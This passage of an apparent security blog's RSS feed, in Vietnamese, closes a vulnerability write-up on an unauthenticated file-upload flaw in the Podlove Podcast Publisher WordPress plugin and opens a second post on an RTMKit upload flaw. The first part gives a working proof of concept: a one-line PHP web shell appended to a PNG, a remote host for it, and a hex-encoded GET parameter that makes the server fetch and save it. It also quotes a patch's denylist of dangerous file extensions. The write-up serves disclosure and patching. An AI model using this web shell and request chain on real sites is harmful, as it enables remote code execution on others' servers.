helpers&#xA;    if (!$filename) {&#xA;      $filename = basename($file);&#xA;    }&#xA;    &#xA;    $check = wp_check_filetype_and_ext($file, $filename);&#xA;    $ext = isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] ? strtolower($check[&amp;#39;ext&amp;#39;]) : null;&#xA;    $wp_type = isset($check[&amp;#39;type&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;type&amp;#39;] ? strtolower($check[&amp;#39;type&amp;#39;]) : null;&#xA;&#xA;    $wp_type_looks_correct = stripos($wp_type, &amp;#39;image/&amp;#39;) === 0;&#xA;    &#xA;    // denielist some exts for extra safety&#xA;    $danger_exts = [&#xA;      &amp;#39;php&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;py&amp;#39;, &amp;#39;rb&amp;#39;, &amp;#39;cgi&amp;#39;, &amp;#39;asp&amp;#39;, &amp;#39;aspx&amp;#39;, &amp;#39;jsp&amp;#39;,&#xA;    ];&#xA;&#xA;    $ext_looks_dangerous = empty($ext) || in_array($ext, $danger_exts, true);&#xA;&#xA;    return $mime_is_image &amp;amp;&amp;amp; !$ext_looks_dangerous &amp;amp;&amp;amp; $wp_type_looks_correct; &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Bản vá đã thêm cả một mớ kiểm tra chặt hơn:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Vẫn giữ check MIME gốc (&lt;code&gt;$mime_is_image&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Thêm check qua WordPress helper &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype_and_ext/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;&lt;/a&gt; để so khớp đuôi file và kiểu MIME thực tế&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có tên file, tự lấy &lt;code&gt;basename()&lt;/code&gt; để kiểm tra&lt;/li&gt;&#xA;&lt;li&gt;Chặn hàng loạt đuôi nguy hiểm (&lt;code&gt;php&lt;/code&gt;, &lt;code&gt;phar&lt;/code&gt;, &lt;code&gt;py&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt;, &lt;code&gt;v.v...&lt;/code&gt;) bằng danh sách đen &lt;code&gt;$danger_exts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kết hợp ba điều kiện: phải là MIME image, đuôi không nguy hiểm, và WP cũng nhận diện đúng kiểu ảnh&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Chuyển file tạm sang vị trí thật bằng &lt;code&gt;move_as_original_file($temp_file)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;download_source()&lt;/code&gt; được gọi từ hàm &lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; khi ảnh chưa tồn tại&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function podlove_handle_cache_files()&#xA;{&#xA;    $source_url = \Podlove\PHP\hex2str(podlove_get_query_var(&amp;#39;podlove_image_cache_url&amp;#39;));&#xA;    ...&#xA;&#xA;    $image = new Image($source_url, $file_name);&#xA;&#xA;    if (!$image-&amp;gt;source_exists()) {&#xA;        $image-&amp;gt;download_source();&#xA;    }&#xA;    ...&#xA;}&#xA;&#xA;function podlove_get_query_var($var_name)&#xA;{&#xA;    if (isset($_GET[$var_name])) {&#xA;        return $_GET[$var_name];&#xA;    }&#xA;&#xA;    return get_query_var($var_name);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; nhận tham số &lt;code&gt;podlove_image_cache_url&lt;/code&gt; từ GET request, sau đó giải mã bằng &lt;code&gt;hex2str()&lt;/code&gt; để chuyển từ định dạng hex sang chuỗi.&#xA;=&amp;gt; Tham số &lt;code&gt;podlove_image_cache_url&lt;/code&gt; phải được truyền dưới dạng mã hex.&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo, hàm khởi tạo đối tượng &lt;strong&gt;Image&lt;/strong&gt; nhằm tạo đường dẫn lưu trữ trong cache và thực hiện tải file từ URL đã giải mã về máy chủ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; được đăng ký làm callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp&amp;#39;, &amp;#39;podlove_handle_cache_files&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nghĩa là hàm sẽ được gọi trên mỗi lần WordPress xử lý request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Request with params (podlove_image_cache_url)&amp;#34;] --&amp;gt; B[&amp;#34;podlove_handle_cache_files()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;hex2str() → $source_url → new Image(...)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_source() → download_url() → temporary file&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;is_image() check&amp;#34;]&#xA;E -- pass --&amp;gt; F[&amp;#34;move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;File accessible → possible RCE&amp;#34;]&#xA;E -- fail --&amp;gt; H[&amp;#34;Delete temp file → stop&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Thêm &lt;code&gt;&amp;lt;php&amp;gt;&lt;/code&gt; tag vào file ảnh và đổi extension thành &lt;code&gt;.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#39;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&amp;#39; &amp;gt;&amp;gt; rce.png&#xA;mv rce.png rce.php&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ cat rce.php&#xA;�PNG&#xA;␦&#xA;IHD��Ud�tEXtSoftwaregnome-screenshot��&amp;gt;-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM &amp;#43;075����IDATH���A&#xA;� ��GHI��l��l�˅��K�n�D&#xA;�H)���a:kooܲ&amp;lt;`�u�o�&#xA;�{�3�9�1�~��      �9����P�1����R�!D&amp;gt;Lk���FT�r�|�Ru��&#x9;u��o&amp;#39;�`��?�!&amp;#34;��&#xA;2k���IEND�B`�&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Lưu file ở đâu đó trên internet, domain không trùng với wordpress domain website,&#xA;ví dụ:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Mã hóa hex(&lt;a href=&#34;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/a&gt;)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;❯ echo -n &amp;#34;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&amp;#34; | xxd -p&#xA;68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Gửi GET request với param &lt;code&gt;podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; title=&#34;Upload file thành công&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;Upload file thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;414&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload file thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Truy cập file vừa tạo và RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#39; alt=&#34;Result&#34; height=&#34;723&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;02/9acf743e6beb9c8e4395ee694d6504&lt;/code&gt; như phân tích trước đó, nó là &lt;code&gt;md5($url)&lt;/code&gt;, sau đó tạo cấu trúc thư mục &lt;code&gt;first_2_characters/remaining_characters&lt;/code&gt; dựa trên kết quả của &lt;code&gt;md5()&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;Podlove Podcast Publisher ≤ 4.2.6&lt;/strong&gt; cho phép tải lên file tùy ý do thiếu kiểm tra định dạng trong &lt;code&gt;move_as_original_file()&lt;/code&gt;. Kẻ tấn công có thể tải file độc hại (ví dụ &lt;code&gt;.php&lt;/code&gt;) lên thư mục:&#xA;&lt;code&gt;wp-content/cache/podlove/&amp;lt;first2&amp;gt;/&amp;lt;rest&amp;gt;/&lt;/code&gt;,&#xA;từ đó dẫn đến &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; nếu file được truy cập công khai.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: kiểm tra MIME yếu, không chặn phần mở rộng nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá (≥ 4.2.7): thêm xác thực bằng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; và danh sách denylist.&lt;/li&gt;&#xA;&lt;li&gt;Cách khắc phục: cập nhật plugin, chặn thực thi PHP trong thư mục cache, xóa file lạ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/podlove-podcasting-plugin-for-wordpress/vulnerability/wordpress-podlove-podcast-publisher-plugin-4-2-6-unauthenticated-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Podlove Podcast Publisher Plugin &amp;lt;= 4.2.6 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-62065 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-04-cve-2025-62065/</link>
      <pubDate>Tue, 04 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-04-cve-2025-62065/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-62065&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-62065&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;: &lt;strong&gt;1.6.5&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.6.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 